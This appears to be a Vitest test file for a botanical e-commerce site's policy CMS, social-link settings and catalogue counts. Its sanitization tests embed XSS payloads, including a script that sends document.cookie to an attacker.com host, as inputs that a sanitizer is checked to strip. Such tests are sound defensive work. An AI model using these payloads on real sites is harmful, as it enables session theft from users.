import { describe, it, expect, beforeAll } from "vitest";
import * as db from "./db.ts";
import { appRouter } from "./routers.ts";
import { sanitizeHtml, isValidSocialUrl, generateWhatsAppLink } from "./sanitize.ts";

function createMockContext(user: any = null) {
  const cookies: Record<string, any> = {};
  const headers: Record<string, string> = {};

  return {
    ctx: {
      user,
      req: {
        protocol: "https",
        headers,
        cookies,
        ip: "127.0.0.1",
        socket: { remoteAddress: "127.0.0.1" },
      } as any,
      res: {
        cookie: (name: string, val: any, opts: any) => {
          cookies[name] = { val, opts };
        },
        clearCookie: (name: string, opts: any) => {
          delete cookies[name];
        },
        setHeader: (name: string, val: string) => {
          headers[name.toLowerCase()] = val;
        },
      } as any,
    },
    cookies,
    headers,
  };
}

describe("TRINAYAA Phase 8 — Policy CMS & Social Media Link Management", () => {
  let customerUser: any;
  let adminUser: any;
  let callerPublic: any;
  let callerCustomer: any;
  let callerAdmin: any;

  beforeAll(async () => {
    const ts = Date.now();
    customerUser = db.usersRepo.create({
      email: `phase8_cust_${ts}@trinayaa.in`,
      password: "CustomerPassword123!",
      name: "Phase 8 Customer",
      phone: "9876543220",
      role: "CUSTOMER",
    });

    adminUser = db.usersRepo.create({
      email: `phase8_admin_${ts}@trinayaa.in`,
      password: "AdminPassword123!",
      name: "Phase 8 Admin",
      phone: "9876543221",
      role: "ADMIN",
    });

    callerPublic = appRouter.createCaller(createMockContext(null).ctx);
    callerCustomer = appRouter.createCaller(createMockContext(customerUser).ctx);
    callerAdmin = appRouter.createCaller(createMockContext(adminUser).ctx);
  });

  // ==========================================
  // 1. PUBLIC POLICY CMS QUERIES
  // ==========================================
  describe("1. Public Policy Queries", () => {
    it("1.1: Retrieves published policies (shipping, returns, privacy, terms)", async () => {
      const shipping = await callerPublic.content.getPolicy({ slug: "shipping" });
      expect(shipping).toBeDefined();
      expect(shipping.slug).toBe("shipping");
      expect(shipping.title).toContain("Shipping");
      expect(shipping.isPublished).toBe(true);
      expect(shipping.content).toBeTruthy();

      const returns = await callerPublic.content.getPolicy({ slug: "returns" });
      expect(returns.slug).toBe("returns");
      expect(returns.title).toContain("Return");

      const privacy = await callerPublic.content.getPolicy({ slug: "privacy" });
      expect(privacy.slug).toBe("privacy");
      expect(privacy.title).toContain("Privacy");

      const terms = await callerPublic.content.getPolicy({ slug: "terms" });
      expect(terms.slug).toBe("terms");
      expect(terms.title).toContain("Terms");
    });

    it("1.2: Aliases 'refund' to 'returns'", async () => {
      const refundPolicy = await callerPublic.content.getPolicy({ slug: "refund" });
      expect(refundPolicy.slug).toBe("returns");
      expect(refundPolicy.title).toContain("Return");
    });

    it("1.3: Throws NOT_FOUND for unknown policy slug", async () => {
      await expect(
        callerPublic.content.getPolicy({ slug: "nonexistent-policy" })
      ).rejects.toThrow(/not found/i);
    });

    it("1.4: Lists all published policies", async () => {
      const published = await callerPublic.content.listPublishedPolicies();
      expect(Array.isArray(published)).toBe(true);
      expect(published.length).toBeGreaterThanOrEqual(4);
      const slugs = published.map((p: any) => p.slug);
      expect(slugs).toContain("shipping");
      expect(slugs).toContain("returns");
      expect(slugs).toContain("privacy");
      expect(slugs).toContain("terms");
    });
  });

  // ==========================================
  // 2. ADMIN POLICY CMS MANAGEMENT
  // ==========================================
  describe("2. Admin Policy Management & Audit Logging", () => {
    it("2.1: Rejects unauthenticated and customer callers from admin policy endpoints", async () => {
      await expect(callerPublic.admin.policies.getAll()).rejects.toThrow();
      await expect(callerCustomer.admin.policies.getAll()).rejects.toThrow();
      await expect(
        callerCustomer.admin.policies.update({
          slug: "shipping",
          title: "Hacked",
          subtitle: "Hacked",
          content: "<p>Hacked</p>",
          isPublished: true,
          lastUpdated: "Today",
        })
      ).rejects.toThrow();
    });

    it("2.2: Admin can fetch all policies and update policy content", async () => {
      const all = await callerAdmin.admin.policies.getAll();
      expect(all).toHaveLength(4);

      const updateResult = await callerAdmin.admin.policies.update({
        slug: "shipping",
        title: "Shipping & Delivery Policy (Updated)",
        subtitle: "Express Pan-India Botanical Delivery",
        content: "<h2>1. Fast Dispatch</h2><p>All items dispatched within 24 hours.</p>",
        isPublished: true,
        lastUpdated: "November 2026",
      });

      expect(updateResult.success).toBe(true);
      expect(updateResult.policy.title).toBe("Shipping & Delivery Policy (Updated)");
      expect(updateResult.policy.subtitle).toBe("Express Pan-India Botanical Delivery");

      // Verify public query reflects the update
      const publicShipping = await callerPublic.content.getPolicy({ slug: "shipping" });
      expect(publicShipping.title).toBe("Shipping & Delivery Policy (Updated)");
      expect(publicShipping.content).toContain("Fast Dispatch");
    });

    it("2.3: Supports unpublishing policy and public endpoint returns draft state notice", async () => {
      // Admin unpublishes 'terms'
      await callerAdmin.admin.policies.update({
        slug: "terms",
        title: "Terms & Conditions",
        subtitle: "Terms of service",
        content: "<p>Draft terms undergoing legal review</p>",
        isPublished: false,
        lastUpdated: "November 2026",
      });

      // Public caller receives draft notice with isPublished: false and empty content
      const publicTerms = await callerPublic.content.getPolicy({ slug: "terms" });
      expect(publicTerms.isPublished).toBe(false);
      expect(publicTerms.content).toBe("");
      expect(publicTerms.message).toContain("being updated");

      // Restore published state
      await callerAdmin.admin.policies.update({
        slug: "terms",
        title: "Terms & Conditions",
        subtitle: "Terms of service and user agreement for TRINAYAA Enterprises.",
        content: "<h2>1. Agreement to Terms</h2><p>By accessing TRINAYAA you agree to our terms.</p>",
        isPublished: true,
        lastUpdated: "November 2026",
      });

      const restoredTerms = await callerPublic.content.getPolicy({ slug: "terms" });
      expect(restoredTerms.isPublished).toBe(true);
      expect(restoredTerms.content).toContain("Agreement to Terms");
    });
  });

  // ==========================================
  // 3. SECURITY: HTML SANITIZATION & XSS PROTECTION
  // ==========================================
  describe("3. Security: HTML Sanitization & XSS Neutralization", () => {
    it("3.1: Strips <script>, <iframe>, <object>, and inline event handlers", () => {
      const malicious = `
        <h2>Safe Heading</h2>
        <script>alert('xss');</script>
        <iframe src="https://attacker.com"></iframe>
        <p onclick="alert('clicked')">Text with event handler</p>
        <img src="x" onerror="alert('error')" />
        <a href="javascript:alert('xss')">Malicious Link</a>
        <a href="https://trinayaa.in">Safe Link</a>
      `;

      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain("<script");
      expect(clean).not.toContain("<iframe");
      expect(clean).not.toContain("onclick");
      expect(clean).not.toContain("onerror");
      expect(clean).not.toContain("javascript:");
      expect(clean).toContain("<h2>Safe Heading</h2>");
      expect(clean).toContain("https://trinayaa.in");
      expect(clean).toContain('rel="noopener noreferrer"');
    });

    it("3.2: Admin policy update automatically cleanses XSS payloads", async () => {
      const xssPayload = `
        <h2>Delivery Notice</h2>
        <script>window.location='https://attacker.com?cookie='+document.cookie</script>
        <p onmouseover="alert('attack')">Safe looking paragraph</p>
      `;

      const result = await callerAdmin.admin.policies.update({
        slug: "returns",
        title: "Return & Refund Policy",
        subtitle: "7-Day Replacement Guarantee",
        content: xssPayload,
        isPublished: true,
        lastUpdated: "November 2026",
      });

      expect(result.policy.content).not.toContain("<script");
      expect(result.policy.content).not.toContain("onmouseover");
      expect(result.policy.content).toContain("<h2>Delivery Notice</h2>");
    });
  });

  // ==========================================
  // 4. SOCIAL MEDIA & WHATSAPP MANAGEMENT
  // ==========================================
  describe("4. Social Media & WhatsApp Link Configuration", () => {
    it("4.1: URL validation allows valid HTTPS URLs and rejects insecure/invalid formats", () => {
      expect(isValidSocialUrl("https://instagram.com/trinayaa_botanicals", "instagram")).toBe(true);
      expect(isValidSocialUrl("https://facebook.com/trinayaa", "facebook")).toBe(true);

      // Insecure HTTP or wrong protocols
      expect(isValidSocialUrl("http://instagram.com/trinayaa", "instagram")).toBe(false);
      expect(isValidSocialUrl("javascript:alert(1)", "instagram")).toBe(false);
      expect(isValidSocialUrl("not-a-url", "facebook")).toBe(false);

      // Wrong domain for platform
      expect(isValidSocialUrl("https://malicious.com/fake", "instagram")).toBe(false);
    });

    it("4.2: Correctly generates official WhatsApp wa.me links with encoded message", () => {
      const link1 = generateWhatsAppLink("919442218990", "Hello TRINAYAA, I have a query about your herbs!");
      expect(link1).toBe("https://wa.me/919442218990?text=Hello%20TRINAYAA%2C%20I%20have%20a%20query%20about%20your%20herbs!");

      const link2 = generateWhatsAppLink("+91 94422-18990", "Hi");
      expect(link2).toBe("https://wa.me/919442218990?text=Hi");

      // Without country code, defaults to India (91)
      const link3 = generateWhatsAppLink("9442218990", "Test");
      expect(link3).toBe("https://wa.me/919442218990?text=Test");

      // Empty phone returns empty string
      expect(generateWhatsAppLink("", "")).toBe("");
    });

    it("4.3: Admin can update social links and public endpoint serves them", async () => {
      const newConfig = {
        instagram: "https://www.instagram.com/trinayaa.botanicals/",
        facebook: "https://www.facebook.com/trinayaa.enterprises/",
        whatsappPhone: "+91 94422 18990",
        whatsappMessage: "Hello TRINAYAA, I would like to order fresh botanicals.",
      };

      const updateRes = await callerAdmin.admin.social.updateConfig(newConfig);
      expect(updateRes.success).toBe(true);
      expect(updateRes.config.instagram).toBe(newConfig.instagram);
      expect(updateRes.config.whatsappPhone).toBe(newConfig.whatsappPhone);

      // Public endpoint retrieves the updated links and generated WhatsApp URL
      const publicSocial = await callerPublic.content.getSocialLinks();
      expect(publicSocial.instagram).toBe(newConfig.instagram);
      expect(publicSocial.facebook).toBe(newConfig.facebook);
      expect(publicSocial.whatsappPhone).toBe(newConfig.whatsappPhone);
      expect(publicSocial.whatsappUrl).toContain("https://wa.me/919442218990?text=");
      expect(publicSocial.whatsappUrl).toContain("fresh%20botanicals");
    });

    it("4.4: Rejects unauthorized callers from modifying social config", async () => {
      await expect(
        callerCustomer.admin.social.updateConfig({
          instagram: "https://instagram.com/hacked",
        })
      ).rejects.toThrow();
    });
  });

  // ==========================================
  // 5. CATALOGUE & SYSTEM INTEGRITY
  // ==========================================
  describe("5. Catalogue Integrity & System Baseline", () => {
    it("5.1: Exactly 162 botanical products and 9 categories preserved", () => {
      const dbInstance = db.getDatabase();
      const prodCount = dbInstance.prepare("SELECT COUNT(*) as c FROM products").get().c;
      const catCount = dbInstance.prepare("SELECT COUNT(*) as c FROM categories").get().c;

      expect(prodCount).toBe(162);
      expect(catCount).toBe(9);
    });

    it("5.2: Product SKUs TRN-1001 through TRN-1162 remain intact", () => {
      const p1 = db.productsRepo.getBySku("TRN-1001");
      const p162 = db.productsRepo.getBySku("TRN-1162");

      expect(p1).toBeDefined();
      expect(p162).toBeDefined();
    });
  });
});
